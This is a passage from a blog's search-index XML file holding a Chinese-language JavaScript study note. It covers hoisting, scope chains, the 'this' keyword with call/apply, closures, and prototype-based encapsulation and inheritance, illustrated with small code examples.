class="hljs-title">function</span></span>()&#123;<br>        var b = 200;<br>        a = b;//a替换了outFunc()中a var a = 100的值 此时a = 200；<br>//      c = a;<br>    &#125;<br>    innerHtml();<br>    console.log([<span class="hljs-string">"inner:"</span>,a]);//200<br>&#125;<br>outFunc();//该函数在运行完后函数中的变量随之销毁<br>console.log(<span class="hljs-string">"outer:"</span>,a);//not defined<br></code></pre></td></tr></table></figure></p><hr><h2 id="二-作用域，作用域链"><a href="#二-作用域，作用域链" class="headerlink" title="二,作用域，作用域链"></a>二,作用域，作用域链</h2><p>作用域：即为代码的作用范围<br>作用域链：函数的变量不使用var声明的情况下，声明变量会一直往上查找该变量的值，直到全局变量还没有就创建一个全局变量<br>Scope对象 - 存放上一层中的对象引用 - 属于某一个函数的属性，当函数一创建就已经有该函数的scope对象引用了<br>每个函数都包含自己本身的VO、Scope对象、作用域链对象<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs bash">var food = <span class="hljs-string">"包子"</span>;<br>var eat = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>console.log(food);//包子<br>&#125;<br>(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>var food = <span class="hljs-string">"油条"</span>;<br>eat()<br>&#125;)<br><br>var foo = 1;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">bar</span></span>()&#123;<br><span class="hljs-keyword">if</span>(!foo)&#123;<br>    var foo = 10;//foo会变量提升到bar函数中，但值不会提升此时提升的foo为undefined ！foo 刚好满足条件<br>&#125;<br>console.log(foo);<br>&#125;<br>bar();<br><br>var a = 1;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">b</span></span>()&#123;<br>a = 10 ;//a = a()<br><span class="hljs-built_in">return</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">a</span></span>()&#123;&#125;//会变量提升到函数的前面<br>&#125;<br>b();<br>console.log(a);<br><br>var f = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span>(f === <span class="hljs-literal">true</span>)&#123;<br>var a = 10;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn</span></span>()&#123;<br>var b = 20;<br>c = 30;<br>&#125;<br>fn();<br>console.log(a);//10<br>console.log(b);//not definnd<br>console.log(c);//30<br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">'a'</span> <span class="hljs-keyword">in</span> window)&#123;<br>var a = 10;//变量提升至<span class="hljs-keyword">if</span>判断外，但值不会提升；没有var 不会先变量提升会先判断是否进入判断<br>&#125;<br>console.log(a);//10<br><br>var a = b =3;<br>(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>var a = b = 5;//var a = 3; b = 5<br>&#125;)();<br>console.log(a);//3<br>console.log(b);//5<br><br>var foo = <span class="hljs-string">'A'</span>;<br>console.log(foo);   //A<br>var foo = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>console.log(<span class="hljs-string">'B'</span>);<br>&#125;<br>console.log(foo);   //<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;console.log(<span class="hljs-string">'B'</span>);&#125;<br>foo();              //B<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">foo</span></span>()&#123;     //函数是在最开始的时候就存在了，但在var foo 声明后被覆盖了，已经被提升;会影响代码的上下顺序<br>console.log(<span class="hljs-string">'C'</span>);<br>&#125;<br>console.log(foo);   //<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;console.log(<span class="hljs-string">'B'</span>);&#125; - <br>foo();              //B<br><br>var a = 1;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">b</span></span>()&#123;<br>console.log(a);//undefined<br>a = 2;<br>console.log(a);//2<br>var a = 3;<br>console.log(a);//3<br>&#125;<br>console.log(a);//1<br>b();<br>console.log(a);//1<br><br>//闭包相关的函数值<br>var x = 100;<br>var y = 200;<br><span class="hljs-keyword">function</span> funcA(x)&#123;<br>var y = 201;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">funcB</span></span>()&#123;<br>    console.log(x);//101<br>    console.log(y);//201<br>&#125;<br><span class="hljs-built_in">return</span> funcB;<br>&#125;<br>var f = funcA(101);<br>f();<br></code></pre></td></tr></table></figure></p><hr><h2 id="三-this关键字"><a href="#三-this关键字" class="headerlink" title="三,this关键字"></a>三,this关键字</h2><p>this 也称为当前对象，是用于对象当中，属于第一人称，所处的环境不一样指代的含义也不同<br>如果在对象的方法中只要在嵌套的函数中的this就不会再指向当前对象中的this了<br>比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">var name = <span class="hljs-string">"张三"</span>;<br>var func = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>console.log(this.name);//此时的this指向的是全局变量<br>&#125;<br>func();<br>fnnc.apply();<br>func.call()<br>var obj = &#123;<br>name:<span class="hljs-string">"王五"</span>,<br>func:<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(this.name);//此时的this 指向的是对象中的name<br>    (<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        console.log(this.name);//此时的this指向的不是对象的name,而是全局变量<br>    &#125;)()<br>&#125;<br>&#125;<br>obj.func();<br></code></pre></td></tr></table></figure></p><p>改变this指向的方法：<br>1.call<br>2.apply<br>两者的作用是相同的，可以帮助完成方法的调用，默认this指向为全局，要想访问嵌套对象，就将其赋值给一个变量<br>call() Or apply()可以改变this的对象，第一个参数是不能省的<br>区别：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">var sum = <span class="hljs-keyword">function</span>(a,b)&#123;console.log(a+b)&#125;<br>sum.call(null,100,200) - 采用的是参数列表<br>sum.apply(null,[100,200]) - 采用的是数组<br></code></pre></td></tr></table></figure></p><p><strong><em>练习</em></strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">var myObject = &#123;<br>foo:<span class="hljs-string">"bar"</span>,<br>func:<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    var self = this;<br>    console.log(this.foo);//bar<br>    console.log(self.foo);//bar<br>    (<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        console.log(this.foo);//undefined<br>        console.log(self.foo);//bar<br>    &#125;)()<br>&#125;<br>&#125;<br>myObject.func();<br><br>var user = &#123;<br>count:1,<br>getcount:<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    <span class="hljs-built_in">return</span> this.count;<br>&#125;<br>&#125;<br>console.log(user.getcount());//1<br>var func = user.getcount;//func就代表user.getcount这个函数<br>console.log(func());//undefined - func()已经成为全局，全局中没有count这个变量,所以值为undefined<br></code></pre></td></tr></table></figure></p><hr><h2 id="四，闭包-closure"><a href="#四，闭包-closure" class="headerlink" title="四，闭包-closure"></a>四，闭包-closure</h2><p>闭包：是指能够访问函数内部变量的函数，定义在函数内部的函数。<br>一个函数引用了外部的自由变量，那么这个函数就叫闭包，被引用的函数和引用的函数是一同存在的。<br>自由变量 - 跨作用域的变量或父级的变量<br>函数必须引用外部变量，函数还必须被引用才能成为闭包<br>优点：可以把一个局部变量存在的时间延长，进行持续保存<br>缺点：如果大量的使用闭包，持续保存的变量会一直占有内存，造成内存的浪费<br>常用：事件处理常常会使用到闭包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">var lis = document.getElementsByTagName(<span class="hljs-string">"li"</span>);<br><span class="hljs-keyword">for</span>(var i = 0;i&lt;lis.length;i++)&#123;<br>//方法实现一<br>(<span class="hljs-keyword">function</span>(index)&#123;//阻止闭包<br>    lis[index].onclick = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        console.log(<span class="hljs-string">"这是选中的地"</span>+(index+1)+<span class="hljs-string">"项"</span>);<br>    &#125;<br>&#125;)(i)<br>//方法实现二<br>var func = <span class="hljs-keyword">function</span>(index)&#123;<br>lis[index].onclick = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        console.log(<span class="hljs-string">"这是选中的地"</span>+(index+1)+<span class="hljs-string">"项"</span>);<br>    &#125;<br>&#125;<br>func(i);<br>&#125;<br><br>//闭包练习<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">Foo</span></span>()&#123;<br>var i = 0;<br><span class="hljs-built_in">return</span> <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(i++);//i++先赋值再运算<br>&#125;<br>&#125;<br>var f1 = Foo();<br>var f2 = Foo();<br>f1();//0<br>f2();//0<br>f2();//1<br></code></pre></td></tr></table></figure></p><hr><h2 id="五，面向对象"><a href="#五，面向对象" class="headerlink" title="五，面向对象"></a>五，面向对象</h2><p>语言分类大致分为两大类 - 范式<br>1.命令式 - 通过语言告诉计算机应该如何做事情<br>比如：java、C语言(为程序语言的发展做出贡献)<br>命令式的两种思想：<br>1.1.面向过程 - 将过程逐一分解为一个一个的步骤执行 - 计算机的思维方式为主体<br>缺点：人的思维有限，如果程序实现的过程很复杂，人会不能完全考虑<br>1.2.面向对象 - 本身就是人的思考方式，人的思维为主体，从自身角度出发 - 特征、行为 - 万物皆对象，对象因关注而产生</p><p>2.声明式 - 告诉计算机我想要什么，然后计算机进行相关的动作，然后计算机自己进行运算得到我想要的结果<br>比如:Css<br>声明式的三大类：<br>2.1.领域特定语言 - DSL - 在特定范围的语言 - HTML、Css、SQL、正则表达式<br>2.2.函数式编程 - 类似公式，计算机就会按照这个公式进行计算并返回结果<br>与命令式编写相比，函数式编程更为精简，能够完善命令式编程的一些缺陷 - lisp、Haskell<br>2.3.逻辑编程 - prolog - 记日志比较好的方法</p><p>构建对象的两种方式：<br>1.基于类的面向对象 - 拥有相同属性的划分为一类，类是对象的抽象，对象是类的实例<br>2.基于原型的面向对象 - JavaScript原型就有一个Object对象，通过一个原型克隆一个对象<br>好处：足够灵活<br>缺点：随意性太强，对于初学者容易出错<br>面向对象三大特征：<br>1.封装 - 需重点了解 - 指实现细节隐藏起来的过程就是封装<br>优点： - 但还需要考虑参数的问题<br>1.1.隐藏实现的细节<br>1.2.重用 - 不变的整合在一起，变化的作为参数</p><p>JavaScript中属性都应为私有，方法可以为公共 - 由我们自己控制<br>pulic - 公共，其他方法可以访问<br>private - 私有，只能自己能够访问<br>set/get - 访问器/修改器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">var Student = <span class="hljs-keyword">function</span>(name,age,gender)&#123;<br>    this.name = name;<br>    var _age = age;//添加 _ 可将变量变为私有变量，外部不能随意访问<br>    var _gender = gender;<br>    <span class="hljs-keyword">if</span>(!Student._init)&#123;<br>        Student.prototype.getAge = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>            <span class="hljs-built_in">return</span> _age;<br>        &#125;<br>        Student.prototype.setAge = <span class="hljs-keyword">function</span>(age)&#123;<br>            <span class="hljs-keyword">if</span>(age &gt; 20 &amp;&amp; age &lt; 30)&#123;<br>                _age = age;<br>                console.log(_age);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                console.log(<span class="hljs-string">"年龄修改不能在 20 - 30 之外"</span>);<br>            &#125;<br>        &#125;<br>        Student.prototype.getGender = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>            <span class="hljs-built_in">return</span> _gender;<br>        &#125;<br>        Student.prototype.setGender = <span class="hljs-keyword">function</span>(gender)&#123;<br>            _gender = gender;<br>            console.log(_gender);<br>        &#125;<br>    &#125;<br>    Student._init = <span class="hljs-literal">true</span>;<br>&#125;<br>var stu = new Student(<span class="hljs-string">"张飞"</span>,20,<span class="hljs-string">"男"</span>);<br>stu.name = <span class="hljs-string">"关羽"</span>;<br>stu.setAge(31);<br>console.log(stu.getAge());<br>console.log(stu.getGender());<br>stu.setGender(<span class="hljs-string">"无"</span>);<br></code></pre></td></tr></table></figure></p><p>2.继承 - 存在于有父与子的关系中 - 出现率较高 - 指采用一个对象的功能并且能够添加新的功能<br>优点：<br>2.1.复用<br>2.2.扩展<br>缺点：<br>如果继承设计的不够完善，会致使变得复杂，难以操控<br>继承的3种方法：<br>1.对象冒充法 - instanceof - 判断是否为继承<br>2.原型链 - 将自己的原型改变为父级的对象<br>3.混合方式 -<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs bash">//1.对象冒充法<br>/*var People = <span class="hljs-keyword">function</span>(name)&#123;<br>    this.name = name;<br>&#125;<br>People.prototype.intro = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(<span class="hljs-string">"HI,我是"</span>+this.name);<br>&#125;<br>var ChinesePeople = <span class="hljs-keyword">function</span>(name)&#123;<br>    this.inhert = People;<br>    this.inhert(name)<br>    delete this.inhert;<br>&#125;<br>var info = new ChinesePeople(<span class="hljs-string">"张三"</span>);<br>console.log(info.name);<br>console.log(info instanceof ChinesePeople);*/<br><br>//  2.原型链<br>/*  var People = <span class="hljs-keyword">function</span>(name)&#123;<br>    this.name = name;<br>&#125;<br>People.prototype.intro = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(<span class="hljs-string">"HI,我是"</span>+this.name);<br>&#125;<br>var ChinesePeople = <span class="hljs-keyword">function</span>(name)&#123;<br>&#125;<br>ChinesePeople.prototype = new People(<span class="hljs-string">"张三"</span>);<br>ChinesePeople.prototype.area = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(<span class="hljs-string">"我是中国人"</span>);<br>&#125;<br>var info = new ChinesePeople(<span class="hljs-string">"张三"</span>);<br>console.log(info.name);<br>console.log(info instanceof ChinesePeople);<br>info.intro();<br>info.area();*/<br><br>//  3.混合<br>/*var People = <span class="hljs-keyword">function</span>(name)&#123;<br>    this.name = name;<br>&#125;<br>People.prototype.intro = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(<span class="hljs-string">"HI,我是"</span>+this.name);<br>&#125;<br>var ChinesePeople = <span class="hljs-keyword">function</span>(name)&#123;<br>    People.call(this.name);<br>&#125;<br>ChinesePeople.prototype = new People(<span class="hljs-string">"张三"</span>);<br>ChinesePeople.prototype.area = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(<span class="hljs-string">"我是中国人"</span>);<br>&#125;<br>var info = new ChinesePeople(<span class="hljs-string">"张三"</span>);<br>console.log(info.name);<br>console.log(info instanceof ChinesePeople);<br>info.intro();<br>info.area();*/<br>3.多态 - JavaScript本身就是一个多态的行为<br><br>var Student = &#123;<br><span class="hljs-string">"name"</span>:<span class="hljs-string">"张飞"</span>,<br><span class="hljs-string">"age"</span>:20,<br><span class="hljs-string">"learn"</span>:<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(this.name+<span class="hljs-string">"学习JavaScript"</span>)<br>&#125;<br>&#125;<br>Student.gander;//访问的属性不存在 值为 undefined<br>Student.learn();<br>Student.name;<br>Student[<span class="hljs-string">"name"</span>];<br>Student[<span class="hljs-string">"lea"</span>+<span class="hljs-string">"rn"</span>];//动态的属性值使用中括号或者字符串拼接<br><br>//构造函数<br>var Student = <span class="hljs-keyword">function</span>(name,age)&#123;<br>this.name = name;<br>this.age = age;<br>this.learn = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(this.name+<span class="hljs-string">" - "</span>+this.age);<br>    var that = this;<br>    (<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        console.log(that);<br>    &#125;())<br>&#125;<br>&#125;<br>var stu1 = new Student(<span class="hljs-string">"张飞"</span>,20);//stu1 为一个对象<br>var stu2 = new Student(<span class="hljs-string">"刘备"</span>,21);<br>Student.prototype.gander = <span class="hljs-string">"男"</span>;//在原型中添加一个性别的属性<br>Student.prototype.play = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;//在原型中创建一个play 的方法<br>console.log(this.name+<span class="hljs-string">" - "</span>+this.age+<span class="hljs-string">" - "</span>+<span class="hljs-string">"喜欢玩游戏"</span>);<br>&#125;<br>stu1.learn();<br>console.log(stu1.gander);<br>stu1.play();<br>stu2.learn();<br>Studetn.prototype;//可以改变一个对象真正的原型，但是不能多次调用<br>stu1.__proto__; //只是更改了stu1的引用原型，而不是本身的原型，只是对象的一个属性，可以通过属性一层一层的访问到对象的原型<br><br>对象 → 自定义对象原型 → Object对象 → Object原型 → Null<br><br><span class="hljs-keyword">if</span>(!Student._int)&#123;//首先判断Student._int是否为假，Student._int事先不存在即为假，进入判断，Student._int变为真，不在进入判断，该判断这样就只能判断一次<br>Student.prototype.learn = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    console.log(this.name+<span class="hljs-string">" - "</span>+this.age);<br>&#125;<br>Student.prototype.play = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;//在原型中创建一个play 的方法<br>    console.log(this.name+<span class="hljs-string">" - "</span>+this.age+<span class="hljs-string">" - "</span>+<span class="hljs-string">"喜欢玩游戏"</span>);<br>&#125;<br>Student._int = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>两个运算符：new - 创建对象; delete - 删除属性 - delete.stu1.name；//stu1中的name属性就被删除了，只能删除原型创建的而不能删不是原型创建的属性<br>两个语句：with - 性能有一定的问题，尽量不使用; for..in - 不拿来循环数组；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var stu1 = new Student(<span class="hljs-string">"张飞"</span>,20);//stu1 为一个对象<br>var stu2 = new Student(<span class="hljs-string">"刘备"</span>,21);<br><span class="hljs-keyword">for</span>(var key <span class="hljs-keyword">in</span> stu1)&#123;<br>console.log([key,stu1[key]]);<br>&#125;<br></code></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
